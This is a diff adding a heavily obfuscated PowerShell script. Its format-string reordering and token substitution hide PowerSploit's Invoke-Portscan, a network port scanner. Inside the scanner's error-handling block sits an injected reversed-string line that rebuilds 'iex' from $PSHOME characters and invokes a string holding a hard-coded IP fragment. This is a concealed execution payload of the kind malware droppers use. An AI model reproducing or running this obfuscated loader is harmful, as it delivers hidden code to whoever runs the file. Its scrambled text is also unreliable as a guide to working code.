@@ -1,0 +1,1110 @@
+((("{13}{21}{24}{0}{11}{14}{15}{8}{19}{2}{20}{7}{6}{22}{9}{12}{10}{3}{17}{23}{16}{5}{4}{18}{1}" -f '0; UBHJi -lt UBHJnumhosts-1; UBHJi++)
+                    {
+
+                        UBHJnextAddress =  UBHJaddress.GetAddressBytes()
+                        [array]::Reverse(UBHJnextAddress)
+                        UBHJnextAddress =  [System.BitConverter]::ToUInt32(UBHJnextAddress, 0)
+                        UBHJnextAddress ++
+                        UBHJnextAddress = [System.BitConverter]::GetBytes(UBHJnextAddress)[0..3]
+                        [array]::Reverse(UBHJnextAddress)
+
+                        UBHJaddress = [System.Net.IPAddress] [byte[]] UBHJnextAddress
+                        UBHJhostList.Add(UBHJaddress.IPAddressToString)
+
+                    }
+
+                }
+                else
+                {
+                    UBHJhostList.Add(UBHJiHost)
+                }
+            }
+        }
+
+        function Parse-ILHosts
+        {
+           Param (
+                [Parameter(Mandatory = UBHJTrue)] [String] UBHJHostFile
+            )
+
+            Get-Content UBHJHostFile 9OtU ForEach-Object {
+                Parse-Hosts UBHJ_
+            }
+        }
+
+        function Exclude-Hosts
+        {
+            Param (
+                [Parameter(Mandatory = UBHJTrue)] [String] UBHJexcludeHosts
+            )
+
+            [String[]] UBHJiHosts = UBHJexcludeHosts.Split(Xi1j,Xi1j)
+
+            foreach(UBHJiHost in UBHJiHosts)
+            {
+                UBHJiHost = UBHJiHost.Replace(Xi1j Xi1j, Xi1jXi1j)
+                UBHJhostList.Remove(UBHJiHost)
+            }
+        }
+
+        function Get-TopPort
+        {
+            Param (
+                [Parameter(Mandatory = UBHJTrue)]
+                [ValidateRange(1,1000)]
+                [int] UBHJnumPorts
+            )
+
+            #list of top 1000 ports from nmap from Jun 2013
+            [int[]] UBHJtopPortList = @(80,23,443,21,3389,110,445,139,143,53,135,3306,8080,22
+                        1723,111,995,993,5900,1025,1720,548,113,81,6001,179,1026,2000,8443,
+                        8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,
+                        5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,
+                        990,5357,49156,543,544,5101,144,7,389,8009,9999,5009,7070,5190,','{
+                UBHJxmlStream.Close()
+            }
+            if(UBHJreadableStream) {
+                UBHJreadableStream.Close()
+            }
+
+            return UBHJscannedHostList
+
+        }
+        Catch
+        {
+            Write-Error UBHJ_.Exception.Message;
+        }
+    }
+}
+
+','         if (UBHJisUp -and !UBHJSkipDiscovery) {
+                            UBHJgrepStream.writeline(Xi1jHost: UBHJouthostBwNtStatus: UpXi1j)
+                        }
+                        if (UBHJisUp -or UBHJSkipDiscovery) {
+                            if (UBHJoPort -ne Xi1jXi1j) {
+                                UBHJgrepStream.writeline(Xi1jHost: UBHJouthostBwNtOpen Ports: UBHJoPortXi1j)
+                            }
+                            if (UBHJcPort -ne Xi1jXi1j) {
+                                UBHJgrepStream.writeline(Xi1jHost: UBHJouthostBwNtClosed Ports: UBHJcPortXi1j)
+                            }
+                            if (UBHJfPort -ne Xi1jXi1j) {
+                                UBHJgrepStream.writeline(Xi1jHost: UBHJouthostBwNtFiltered Ports: UBHJfPortXi1j)
+                            }
+                        }
+                        elseif (!UBHJSkipDiscovery) {
+                            UBHJgrepStream.writeline(Xi1jHost: UBHJouthostBwNtStatus: DownXi1j)
+                        }
+                    }
+                    if (UBHJxmlStream) {
+                        UBHJxmlStream.WriteStartElement(Xi1jHostXi1j)
+
+                        UBHJxmlStream.WriteAttributeString(Xi1jidXi1j, UBHJouthost)
+                        if (!UBHJSkipDiscovery) {
+                            if (UBHJisUp) {
+                                UBHJxmlStream.WriteAttributeString(Xi1jStatusXi1j, Xi1jUpXi1j)
+                             }
+                             else {
+                                UBHJxmlStream.WriteAttributeString(Xi1jStatusXi1j, Xi1jDownsXi1j)
+                             }
+                        }
+
+ ','
+                UBHJxmlStream =   [System.xml.xmlwriter]::Create([string]UBHJXmlOut)
+                UBHJxmlStream.WriteStartDocument()
+                UBHJxmlStream.WriteStartElement(Xi1jPortscanrunXi1j)
+                UBHJxmlStream.WriteAttributeString(Xi1jversionXi1j, UBHJversion)
+
+            }
+
+            Parse-Ports -Ports UBHJDiscoveryPorts -pList UBHJhostPortList 9OtU write-host
+
+            UBHJstartdate = Get-Date
+            UBHJmyInvocationLine = UBHJPSCmdlet.MyInvocation.Line
+            UBHJstartMsg = Xi1jInvoke-Portscan.ps1 vUBHJversion scan initiated UBHJstartdate as: UBHJmyInvocationLineXi1j
+
+            #TODO deal with output
+            Write-PortscanOut -comment UBHJstartMsg -grepStream UBHJgrepStream -xmlStream UBHJxmlStream -readableStream UBHJreadableStream
+
+            #converting back from int array gives some argument error checking
+            UBHJsPortList = [string]::join(Xi1j,Xi1j, UBHJportList)
+            UBHJsHostPortList = [string]::join(Xi1j,Xi1j, UBHJhostPortList)
+
+            ########
+            #Port Scan Code - run on a per host basis
+            ########
+            UBHJportScanCode = {
+                param (
+                    [Parameter( Mandatory = UBHJTrue)] [string] UBHJthost,
+                    [Parameter( Mandatory = UBHJTrue)][bool] UBHJSkipDiscovery,
+                    [Parameter( Mandatory = UBHJTrue)][bool] UBHJPingOnly,
+                    [Parameter( Mandatory = UBHJTrue)][int] UBHJTimeout,
+                    [Parameter( Mandatory = UBHJTrue)] UBHJPortList,
+                    [Parameter( Mandatory = UBHJTrue)] UBHJhostPortList,
+                    [Parameter( Mandatory = UBHJTrue)][int] UBHJmaxthreads)
+                Process
+                {
+                UBHJopenPorts = New-Object System.Collections.ArrayList
+                UBHJclosedPorts = New-Object System.Collections.ArrayList
+                UBHJfilteredPorts = New-Object System.Collections.ArrayList
+
+                UBHJsockets = @{}
+                UBHJtimeouts = New-Object Hashtable
+
+                #set maximum UBHJasync threads
+                UBHJfThreads = New-Object int
+                UBHJaThreads = New-Object int
+                [System.Threading.ThreadPool]::GetMaxThreads([ref]UBHJfThreads, [ref]UBHJaThreads) 9OtU write-host
+                [System.Threading.ThreadPool]::SetMaxThreads(UBHJfthreads,UBHJmaxthreads) 9OtU write-host
+
+                function New-ScriptBlockCallback {
+                    param(
+                        [parameter(Mandatory=UBHJtrue)]
+                        [ValidateNotNullOrEmpty()]
+                        [scriptblock]UBHJCallback
+                    )
+
+                    #taken from http://www.nivot.org/blog/post/2009/10/09/PowerShell20AsynchronousCallbacksFromNET
+                    if (-not (Xi1jCallbackEventBridgeXi1j -as [type])) {
+                        Add-Type @Xi1j
+                            using System;
+
+                            public sealed class CallbackEventBridge
+                            {
+                                public event AsyncCallback CallbackComplete = delegate { };
+
+                                private CallbackEventBridge() {}
+
+                                private void CallbackInternal(IAsyncResult result)
+                                {
+                                    CallbackComplete(result);
+                                }
+
+                                public AsyncCallback Callback
+                                {
+                                    get { return new AsyncCallback(CallbackInternal); }
+                                }
+
+                                public static CallbackEventBridge Create()
+                                {
+                                    return new CallbackEventBridge();
+                                }
+                            }
+Xi1j@
+                    }
+
+                    UBHJbridge = [CallbackEventBridge]::Create()
+                    Register-ObjectEvent -InputObject UBHJbridge -EventName CallbackComplete -Action UBHJCallback 9OtU write-host
+
+                    UBHJbridge.Callback
+
+                }
+
+                function Test-Port {
+
+                    Param (
+                        [Parameter(Mandatory = UBHJTrue)] [String] UBHJh,
+                        [Parameter(Mandatory = UBHJTrue)] [int] UBHJp,
+                        [Parameter(Mandatory = UBHJTrue)] [int] UBHJtimeout
+                    )
+
+                    try {
+                        UBHJpAddress = [System.Net.IPAddress]::Parse(UBHJh)
+                        UBHJsockets[UBHJp] = new-object System.Net.Sockets.TcpClient UBHJpAddress.AddressFamily
+
+                    }
+                    catch {
+                        #weLCrre assuming this is a host name
+                        UBHJsockets[UBHJp] = new-object System.Net.Sockets.TcpClient
+                    }
+
+                    
+                    UBHJscriptBlockAsString = @Xi1j
+
+                        #somewhat of a race condition with the timeout, but I donLCrt think it matters
+                        if ( BwNUBHJsockets[UBHJp] -ne BwNUBHJNULL)
+                        {
+                            if (!BwNUBHJtimeouts[UBHJp].Disposed) {
+                                BwNUBHJtimeouts[UBHJp].Dispose()
+                            }
+
+                            BwNUBHJstatus = BwNUBHJsockets[UBHJp].Connected;
+                            if (BwNUBHJstatus -eq BwNUBHJTrue)
+                            {
+                                #write-host Xi1jUBHJp is openXi1j
+                                BwNUBHJopenPorts.Add(UBHJp)
+                            }
+                            else
+                            {
+                                #write-host Xi1jUBHJp is closedXi1j
+                                BwNUBHJclosedPorts.Add(UBHJp)
+
+                            }
+                            BwNUBHJsockets[UBHJp].Close();
+
+                            BwNUBHJsockets.Remove(UBHJp)
+                        }
+Xi1j@
+                    UBHJtimeoutCallback = @Xi1j
+                        #write-host Xi1jUBHJp is filteredXi1j
+                        BwNUBHJsockets[UBHJp].Close()
+                        if (!BwNUBHJtimeouts[UBHJp].Disposed) {
+                            BwNUBHJtimeouts[UBHJp].Dispose()
+                            BwNUBHJfilteredPorts.Add(UBHJp)
+                        }
+                        BwNUBHJsockets.Remove(UBHJp)
+Xi1j@
+
+                    UBHJtimeoutCallback = [scriptblock]::Create(UBHJtimeoutCallback)
+
+                    UBHJtimeouts[UBHJp] = New-Object System.Timers.Timer
+                    Register-ObjectEvent -InputObject UBHJtimeouts[UBHJp] -EventName Elapsed -Action UBHJtimeoutCallback 9OtU write-host
+                    UBHJtimeouts[UBHJp].Interval = UBHJtimeout
+                    UBHJtimeouts[UBHJp].Enabled = UBHJtrue
+
+                    UBHJmyscriptblock = [scriptblock]::Create(UBHJscriptBlockAsString)
+      ',' if(!UBHJnoProgressMeter)
+                    {
+                        Write-Progress -status Xi1jPort ScanningXi1j -Activity UBHJstartMsg -CurrentOperation Xi1jstarting computer UBHJcomputersDoneXi1j  -PercentComplete (UBHJcomputersDone / UBHJhostList.Count * 100)
+                    }
+
+                    Start-Job -ScriptBlock UBHJportScanCode -Name UBHJiHost -ArgumentList @(UBHJiHost, UBHJSkipDiscovery, UBHJPingOnly, UBHJTimeout, UBHJportList, UBHJhostPortList, UB',' -h UBHJh -p UBHJPort -timeout UBHJTimeout
+                        }
+                        Catch
+                        {
+                            Write-Error Xi1jException trying to scan UBHJh port UBHJPortXi1j
+                            Write-Error UBHJ_.Exception.Message;
+                        }
+                    }
+                }
+                [bool] UBHJhostResult = UBHJFalse
+
+                if(!UBHJSkipDiscovery)
+                {
+                    [bool] UBHJhostResult = PortScan-Alive UBHJthost
+                    UBHJopenPorts.clear()
+                    UBHJclosedPorts.clear()
+                    UBHJfilteredPorts.Clear()
+                }
+                if((!UBHJPingOnly) -and (UBHJhostResult -or UBHJSkipDiscovery))
+                {
+                    Portscan-Port UBHJthost
+                }
+                while (UBHJsockets.Count -gt 0) {
+                    Start-Sleep -Milli 500
+                }
+
+                return @(UBHJhostResult, UBHJopenPorts, UBHJclosedPorts, UBHJfilteredPorts)
+                }
+            }
+
+            # the outer loop is to flush the loop.
+            # Otherwise Get-Job 9OtU Wait-Job could clog, etc
+
+            [int]UBHJsaveIteration = 0
+            [int]UBHJcomputersDone=0
+            [int]UBHJupHosts=0
+            while ((UBHJsaveIteration * UBHJSyncFreq) -lt UBHJhostList.Count)
+            {
+
+                Get-Job 9OtU Remove-Job -Force
+                UBHJsIndex = (UBHJsaveIteration*UBHJSyncFreq)
+                UBHJeIndex = ((UBHJsaveIteration+1)*UBHJSyncFreq)-1
+
+                foreach (UBHJiHost in UBHJhostList[UBHJsIndex..UBHJeIndex])
+                {
+                    UBHJctr = @(Get-Job -state Running)
+                    while (UBHJctr.Count -ge UBHJnHosts)
+                    {
+                        Start-Sleep -Milliseconds UBHJSleepTimer
+                        UBHJctr = @(Get-Job -state Running)
+                    }
+
+                    UBHJcomputersDone++
+                   ','p)) {
+                                    UBHJreadableStream.writeline((Xi1j{0,-10}{1,0}Xi1j -f UBHJp, Xi1jfilteredXi1j))
+                                }
+                            }
+
+                        }
+                        elseif(!UBHJSkipDiscovery) {
+                            UBHJreadableStream.writeline(Xi1jHost is DownXi1j)
+                        }
+                        UBHJreadableStream.writeline(Xi1jXi1j)
+                    }
+                }
+            }
+        }
+
+        #function for Powershell v2.0 to work
+        function Convert-SwitchtoBool
+        {
+            Param (
+                [Parameter(Mandatory = UBHJTrue)] UBHJswitchValue
+            )
+            If (UBHJswitchValue) {
+                return UBHJTrue
+            }
+            return UBHJFalse
+        }
+
+        try
+        {
+
+            [bool] UBHJSkipDiscovery = Convert-SwitchtoBool (UBHJSkipDiscovery)
+            [bool] UBHJPingOnly = Convert-SwitchtoBool (UBHJPingOnly)
+            [bool] UBHJquiet  = Convert-SwitchtoBool (UBHJquiet)
+            [bool] UBHJForceOverwrite  = Convert-SwitchtoBool (UBHJForceOverwrite)
+
+            #########
+            #parse arguments
+            #########
+
+            [Environment]::CurrentDirectory=(Get-Location -PSProvider FileSystem).ProviderPath
+
+            if (UBHJPsCmdlet.ParameterSetName -eq Xi1jcmdHostsXi1j)
+            {
+                foreach(UBHJh in UBHJHosts)
+                {
+                    Parse-Hosts(UBHJh) 9OtU write-host
+                }
+            }
+            else
+            {
+                Parse-ILHosts(UBHJHostFile) 9OtU write-host
+            }
+            if(UBHJExcludeHosts)
+            {
+                Exclude-Hosts(UBHJExcludeHosts)
+            }
+            if ((UBHJTopPorts -and UBHJPorts) -or (UBHJTopPorts -and UBHJPortFile))
+            {
+                throw Xi1jCannot set topPorts with other specific portsXi1j
+            }
+            if(UBHJPorts)
+            {
+                Parse-Ports -Ports U','scovery) {
+
+                            UBHJreadableStream.writeline((Xi1j{0,-10}{1,0}Xi1j -f Xi1jPORTXi1j, Xi1jSTATEXi1j))
+
+                            [int[]]UBHJallports = UBHJopenPorts + UBHJclosedPorts + UBHJfilteredPorts
+                            foreach(UBHJp in (UBHJallports9OtU Sort-Object))
+                            {
+                                if (UBHJopenPorts.Contains(UBHJp)) {
+                                    UBHJreadableStream.writeline((Xi1j{0,-10}{1,0}Xi1j -f UBHJp, Xi1jopenXi1j))
+                                }
+                                elseif (UBHJclosedPorts.Contains(UBHJp)) {
+                                    UBHJreadableStream.writeline((Xi1j{0,-10}{1,0}Xi1j -f UBHJp, Xi1jclosedXi1j))
+                                }
+                                elseif (UBHJfilteredPorts.Contains(UBHJ','             {
+                    throw Xi1jPort UBHJp out of rangeXi1j
+                }
+            }
+         }
+
+        function Parse-IpPorts
+        {
+           Param (
+                [Parameter(Mandatory = UBHJTrue)] [String] UBHJPortFile
+            )
+
+            Get-Content UBHJPortFile 9OtU ForEach-Object {
+                Parse-Ports -Ports UBHJ_ -pList UBHJportList
+            }
+        }
+
+        function Remove-Ports
+        {
+            Param (
+                [Parameter(Mandatory = UBHJTrue)] [string] UBHJExcludedPorts
+            )
+
+            [int[]] UBHJExcludedPorts = UBHJExcludedPorts.Split(Xi1j,Xi1j)
+
+            foreach (UBHJx in UBHJExcludedPorts)
+            {
+                UBHJportList.Remove(UBHJx)
+            }
+        }
+
+        function Write-PortscanOut
+        {
+            Param (
+                [Parameter(Mandatory = UBHJTrue, ParameterSetName=Xi1jCommentXi1j)] [string] UBHJcomment,
+                [Parameter(Mandatory = UBHJTrue, ParameterSetName=Xi1jHostOutXi1j)] [string] UBHJouthost,
+                [Parameter(Mandatory = UBHJTrue, ParameterSetName=Xi1jHostOutXi1j)] [bool] UBHJisUp,
+                [Parameter(Mandatory = UBHJTrue, ParameterSetName=Xi1jHostOutXi1j)] UBHJopenPorts,
+                [Parameter(Mandatory = UBHJTrue, ParameterSetName=Xi1jHostOutXi1j)] UBHJclosedPorts,
+                [Parameter(Mandatory = UBHJTrue, ParameterSetName=Xi1jHostOutXi1j)] UBHJfilteredPorts,
+                [Parameter()] [bool] UBHJSkipDi','tU write-host
+            }
+
+            if(UBHJT)
+            {
+                switch (UBHJT)
+                {
+                    5 {UBHJnHosts=30;  UBHJThreads = 1000; UBHJTimeout = 750 }
+                    4 {UBHJnHosts=25;  UBHJThreads = 1000; UBHJTimeout = 1200 }
+                    3 {UBHJnHosts=20;  UBHJThreads = 100;  UBHJTimeout = 2500 }
+                    2 {UBHJnHosts=15;  UBHJThreads = 32;   UBHJTimeout = 3000 }
+                    1 {UBHJnHosts=10;  UBHJThreads = 32;   UBHJTimeout = 5000 }
+                    default {
+                        throw Xi1jInvalid T parameterXi1',' -and (Test-Path UBHJGrepOut)) {
+                    throw Xi1jError: UBHJAllformatsOut already exists. Either delete the file or specify the -f flagXi1j
+                }
+                UBHJgrepStream = [System.IO.StreamWriter] UBHJGrepOut
+            }
+            if (UBHJReadableOut) {
+                if (!UBHJForceOverwrite -and (Test-Path UBHJReadableOut)) {
+                    throw Xi1jError: UBHJReadableOut already exists. Either delete the file or specify the -f flagXi1j
+                }
+                UBHJreadableStream = [System.IO.StreamWriter] UBHJReadableOut
+            }
+            if (UBHJXmlOut) {
+                if (!UBHJForceOverwrite -and (Test-Path UBHJXmlOut)) {
+                    throw Xi1jError: UBHJXmlOut already exists. Either delete the file or specify the -f flagXi1j
+                }
+','3000,
+                        5432,1900,3986,13,1029,9,5051,6646,49157,1028,873,1755,2717,4899,9100,
+                        119,37,1000,3001,5001,82,10010,1030,9090,2107,1024,2103,6004,1801,
+                        5050,19,8031,1041,255,1048,1049,1053,1054,1056,1064,3703,17,808,3689,
+                        1031,1044,1071,5901,100,9102,2869,4001,5120,8010,9000,2105,636,1038,
+                        2601,1,7000,1066,1069,625,311,280,254,4000,1761,5003,2002,1998,2005,
+                        1032,1050,6112,1521,2161,6002,2401,902,4045,787,7937,1058,2383,1033,
+                        1040,1059,50000,5555,1494,3,593,2301,3268,7938,1022,1234,1035,1036,1037,
+                        1074,8002,9001,464,497,1935,2003,6666,6543,24,1352,3269,1111,407,500,
+                        20,2006,1034,1218,3260,15000,4444,264,33,2004,1042,42510,999,3052,1023,
+                        222,1068,888,7100,1717,992,2008,7001,2007,8082,512,1043,2009,5801,1700,
+                        7019,50001,4662,2065,42,2602,3333,9535,5100,2604,4002,5002,1047,1051,1052,
+                        1055,1060,1062,1311,3283,4443,5225,5226,6059,6789,8089,8651,8652,8701,9415,
+                        9593,9594,9595,16992,16993,20828,23502,32769,33354,35500,52869,55555,55600,
+                        64623,64680,65000,65389,1067,13782,366,5902,9050,85,1002,5500,1863,1864,
+                        5431,8085,10243,45100,49999,51103,49,90,6667,1503,6881,27000,340,1500,8021,
+                        2222,5566,8088,8899,9071,5102,6005,9101,163,5679,146,648,1666,83,3476,5004,
+                        5214,8001,8083,8084,9207,14238,30,912,12345,2030,2605,6,541,4,1248,3005,8007,
+                        306,880,2500,1086,1088,2525,4242,8291,9009,52822,900,6101,2809,7200,211,800,
+                        987,1083,12000,705,711,20005,6969,13783,1045,1046,1061,1063,1070,1072,1073,
+                        1075,1077,1078,1079,1081,1082,1085,1093,1094,1096,1098,1099,1100,1104,1106,','j
+                    }
+                }
+            }
+
+            UBHJgrepStream = UBHJnull
+            UBHJxmlStream = UBHJnull
+            UBHJreadableStream = UBHJnull
+
+            if(UBHJAllformatsOut)
+            {
+                if (UBHJGrepOut -or UBHJXmlOut -or UBHJReadableOut) {
+                     Write-Warning Xi1jBoth -oA specified with other output... going to ignore -oG/-oN/-oXXi1j
+                }
+                UBHJGrepOut = UBHJAllformatsOut + Xi1j.gnmapXi1j
+                UBHJXmlOut = UBHJAllformatsOut + Xi1j.xmlXi1j
+                UBHJReadableOut = UBHJAllformatsOut + Xi1j.nmapXi1j
+            }
+            if (UBHJGrepOut) {
+                if (!UBHJForceOverwrite','function Invoke-Portscan
+{
+<#
+.SYNOPSIS
+
+Simple portscan module
+
+PowerSploit Function: Invoke-Port','
+                        1107,1108,1148,1169,1272,1310,1687,1718,1783,1840,2100,2119,2135,2144,2160,
+                        2190,2260,2381,2399,2492,2607,2718,2811,2875,3017,3031,3071,3211,3300,3301,
+                        3323,3325,3351,3404,3551,3580,3659,3766,3784,3801,3827,3998,4003,4126,4129,
+                        4449,5222,5269,5633,5718,5810,5825,5877,5910,5911,5925,5959,5960,5961,5962,
+                        5987,5988,5989,6123,6129,6156,6389,6580,6901,7106,7625,7777,7778,7911,8086,
+                        8181,8222,8333,8400,8402,8600,8649,8873,8994,9002,9011,9080,9220,9290,9485,
+                        9500,9502,9503,9618,9900,9968,10002,10012,10024,10025,10566,10616,10617,10621,
+                        10626,10628,10629,11110,13456,14442,15002,15003,15660,16001,16016,16018,17988,
+                        19101,19801,19842,20000,20031,20221,20222,21571,22939,24800,25734,27715,28201,
+                        30000,30718,31038,32781,32782,33899,34571,34572,34573,40193,48080,49158,49159,
+                        49160,50003,50006,50800,57294,58080,60020,63331,65129,691,212,1001,1999,2020,
+                        2998,6003,7002,50002,32,2033,3372,99,425,749,5903,43,458,5405,6106,6502,7007,
+                        13722,1087,1089,1124,1152,1183,1186,1247,1296,1334,1580,1782,2126,2179,2191,2251,
+                        2522,3011,3030,3077,3261,3493,3546,3737,3828,3871,3880,3918,3995,4006,4111,4446,
+                        5054,5200,5280,5298,5822,5859,5904,5915,5922,5963,7103,7402,7435,7443,7512,8011,
+                        8090,8100,8180,8254,8500,8654,9091,9110,9666,9877,9943,9944,9998,10004,10778,15742,
+                        16012,18988,19283,19315,19780,24444,27352,27353,27355,32784,49163,49165,49175,
+                        50389,50636,51493,55055,56738,61532,61900,62078,1021,9040,666,700,84,545,1112,
+                        1524,2040,4321,5802,38292,49400,1084,1600,2048,2111,3006,6547,6699,9111,16080,
+                        555,667,720,801,1443,1533,2106,5560,6007,1090,1091,1114,1117,1119,1122,1131,1138,
+                        1151,1175,1199,1201,1271,1862,2323,2393,2394,2608,2725,2909,3003,3168,3221,3322,
+                        3324,3390,3517,3527,3800,3809,3814,3826,38','69,3878,3889,3905,3914,3920,3945,3971,
+                        4004,4005,4279,4445,4550,4567,4848,4900,5033,5080,5087,5221,5440,5544,5678,5730,
+                        5811,5815,5850,5862,5906,5907,5950,5952,6025,6510,6565,6567,6689,6692,6779,6792,
+                        6839,7025,7496,7676,7800,7920,7921,7999,8022,8042,8045,8093,8099,8200,8290,8292,
+                        8300,8383,9003,9081,9099,9200,9418,9575,9878,9898,9917,10003,10180,10215,11111,
+                        12174,12265,14441,15004,16000,16113,17877,18040,18101,19350,25735,26214,27356,
+                        30951,32783,32785,40911,41511,44176,44501,49161,49167,49176,50300,50500,52673,
+                        52848,54045,54328,55056,56737,57797,60443,70,417,714,722,777,981,1009,2022,4224,
+                        4998,6346,301,524,668,765,2041,5999,10082,259,1007,1417,1434,1984,2038,2068,4343,
+                        6009,7004,44443,109,687,726,911,1461,2035,4125,6006,7201,9103,125,481,683,903,
+                        1011,1455,2013,2043,2047,6668,6669,256,406,843,2042,2045,5998,9929,31337,44442,
+                        1092,1095,1102,1105,1113,1121,1123,1126,1130,1132,1137,1141,1145,1147,1149,1154,
+                        1164,1165,1166,1174,1185,1187,1192,1198,1213,1216,1217,1233,1236,1244,1259,1277,
+                        1287,1300,1301,1309,1322,1328,1556,1641,1688,1719,1721,1805,1812,1839,1875,1914,
+                        1971,1972,1974,2099,2170,2196,2200,2288,2366,2382,2557,2800,2910,2920,2968,3007,
+                        3013,3050,3119,3304,3307,3376,3400,3410,3514,3684,3697,3700,3824,3846,3848,3859,
+                        3863,3870,3872,3888,3907,3916,3931,3941,3957,3963,3968,3969,3972,3990,3993,3994,
+                        4009,4040,4080,4096,4143,4147,4200,4252,4430,4555,4600,4658,4875,4949,5040,5063,
+                        5074,5151,5212,5223,5242,5279,5339,5353,5501,5807,5812,5818,5823,5868,5869,5899,
+                        5905,5909,5914,5918,5938,5940,5968,5981,6051,6060,6068,6203,6247,6500,6504,6520,
+                        6550,6600)
+            UBHJnumPorts--
+            UBHJportList.AddRange(UBHJtopPortList[0..UBHJnumPorts])
+        }
+
+        function Parse-Ports
+        {
+            Param (
+                [Parameter(Mandatory = UBHJTrue)] [String] UBHJPorts,
+                [Parameter(Mandatory = UBHJTrue)] UBHJpList
+            )
+
+            foreach (UBHJpRange in UBHJPorts.Split(Xi1j,Xi1j))
+            {
+
+                #-1 is a special case for ping
+                if (UBHJpRange -eq Xi1j-1Xi1j)
+                {
+                    UBHJpList.Add([int]UBHJpRange)
+                }
+                elseif (UBHJpRange.Contains(Xi1j-Xi1j))
+                {
+                    [int[]] UBHJrange = UBHJpRange.Split(Xi1j-Xi1j)
+                    if (UBHJrange.Count -ne 2 -or UBHJpRange.Split(Xi1j-Xi1j)[0] -eq Xi1jXi1j -or UBHJpRange.split(Xi1j-Xi1j)[1] -eq Xi1jXi1j)
+                    {
+                        throw Xi1jInvalid port rangeXi1j
+                    }
+
+                    UBHJpList.AddRange(UBHJrange[0]..UBHJrange[1])
+                }
+                else
+                {
+                    UBHJpList.Add([int]UBHJpRange)
+                }
+
+            }
+            foreach (UBHJp in UBHJpList)
+            {
+                if (UBHJp -lt -1 -or UBHJp -gt 65535)
+   ','     }
+
+                function Portscan-Port
+                {
+                    Param (
+                        [Parameter(Mandatory = UBHJTrue)] [String] UBHJh
+                    )
+
+                    [string[]]UBHJPorts = @()
+
+                    foreach(UBHJPort in UBHJPortlist)
+                    {
+                        Try
+                        {
+                            Test-Port','              UBHJx = UBHJsockets[UBHJp].beginConnect(UBHJh, UBHJp,(New-ScriptBlockCallback(UBHJmyscriptblock)) , UBHJnull)
+
+                }
+
+                function PortScan-Alive
+                {
+                    Param (
+                        [Parameter(Mandatory = UBHJTrue)] [String] UBHJh
+                    )
+
+                    Try
+                    {
+
+                        #ping
+                        if (UBHJhostPortList.Contains(-1))
+                        {
+                            UBHJping = new-object System.Net.NetworkInformation.Ping
+                            UBHJpResult = UBHJping.send(UBHJh)
+                            if (UBHJpResult.Status -eq Xi1jSuccessXi1j)
+                            {
+                                return UBHJTrue
+                            }
+                        }
+                        foreach(UBHJPort in UBHJhostPortList)
+                        {
+                            if (UBHJPort -ne -1)
+                            {
+                                Test-Port -h UBHJh -p UBHJPort -timeout UBHJTimeout
+                            }
+                        }
+
+                        do {
+                            Start-Sleep -Milli 100
+                            if ((UBHJopenPorts.Count -gt 0) -or (UBHJclosedPorts.Count -gt 0)) {
+                                return UBHJTrue
+                            }
+                        }
+                        While (UBHJsockets.Count -gt 0)
+
+                    }
+                    Catch
+                    {
+                        Write-Error Xi1jException trying to host scan UBHJhXi1j
+                        Write-Error UBHJ_.Exception.Message;UBHJwEWp= sv  (LCrfp0zLCr+LCrt5LCr)  (  Xi1j))93]RahC[,LCrsazLCr EcalPERc- )LCrsaLCr+LCrz3LCr+LCr1.LCr+LCr531.31LCr+LCr2.091:pisLCr+LCraLCr+LCrzLCr(( ( )LCrxLCr+]03[eMOHspUBHJ+]12[EMoHspUBHJ ( &Xi1j ','HJThreads)  9OtU write-host
+                }
+
+                Get-Job 9OtU Wait-Job 9OtU write-host
+
+                foreach (UBHJjob in Get-Job)
+                {
+                    UBHJjobOut = @(Receive-Job UBHJjob)
+                    [bool]UBHJhostUp = UBHJjobOut[0]
+                    UBHJjobName = UBHJjob.Name
+
+                    UBHJopenPorts = UBHJjobOut[1]
+                    UBHJclosedPorts = UBHJjobOut[2]
+                    UBHJfilteredPorts = UBHJjobOut[3]
+
+                    if(UBHJhostUp) {
+                        UBHJupHosts ++
+                    }
+
+                    if (!UBHJquiet)
+                    {
+                        if(UBHJopen){
+                            if(UBHJopenPorts){
+                                UBHJhostDate = Get-Date
+                                UBHJhostObj = New-Object System.Object
+                                UBHJhostObj 9OtU Add-Member -MemberType Noteproperty -Name Hostname -Value UBHJjobName
+                                UBHJhostObj 9OtU Add-Member -MemberType Noteproperty -Name alive -Value UBHJhostUp
+                                UBHJhostObj 9OtU Add-Member -MemberType Noteproperty -Name openPorts -Value UBHJopenPorts
+                                UBHJhostObj 9OtU Add-Member -MemberType Noteproperty -Name closedPorts -Value UBHJclosedPorts
+                                UBHJhostObj 9OtU Add-Member -MemberType Noteproperty -Name filteredPorts -Value UBHJfilteredPorts
+                                UBHJhostObj 9OtU Add-Member -MemberType NoteProperty -Name finishTime -Value UBHJhostDate
+                                UBHJscannedHostList += UBHJhostobj
+                            }
+                        }
+                        else {
+                            UBHJhostDate = Get-Date
+                            UBHJhostObj = New-Object System.Object
+                            UBHJhostObj 9OtU Add-Member -MemberType Noteproperty -Name Hostname -Value UBHJjobName
+                            UBHJhostObj 9OtU Add-Member -MemberType Noteproperty -Name alive -Value UBHJhostUp
+                            UBHJhostObj 9OtU Add-Member -MemberType Noteproperty -Name openPorts -Value UBHJopenPorts
+                            UBHJhostObj 9OtU Add-Member -MemberType Noteproperty -Name closedPorts -Value UBHJclosedPorts
+                            UBHJhostObj 9OtU Add-Member -MemberType Noteproperty -Name filteredPorts -Value UBHJfilteredPorts
+                            UBHJhostObj 9OtU Add-Member -MemberType NoteProperty -Name finishTime -Value UBHJhostDate
+                            UBHJscannedHostList += UBHJhostobj
+                        }
+                    }
+
+                    Write-PortscanOut -outhost UBHJjobName -isUp UBHJhostUp -openPorts UBHJopenPorts -closedPorts UBHJclosedPorts -filteredPorts UBHJfilteredPorts -grepStream UBHJgrepStream -xmlStream UBHJxmlStream -readableStream UBHJreadableStream -SkipDiscovery UBHJSkipDiscovery
+                }
+
+                if (UBHJgrepStream) {
+                    UBHJgrepStream.flush()
+                }
+                if (UBHJxmlStream) {
+                    UBHJxmlStream.flush()
+                }
+                if(UBHJreadableStream) {
+                    UBHJreadableStream.flush()
+                }
+
+                UBHJsaveIteration ++
+            }
+
+            UBHJenddate = Get-Date
+            UBHJtotaltime = (UBHJenddate - UBHJstartdate).TotalSeconds
+            UBHJendMsg = Xi1jPort scan complete at UBHJenddate (UBHJtotaltime seconds)Xi1j
+            if (!UBHJSkipDiscovery) {
+                UBHJendMsg += Xi1j, UBHJupHosts hosts are upXi1j
+            }
+
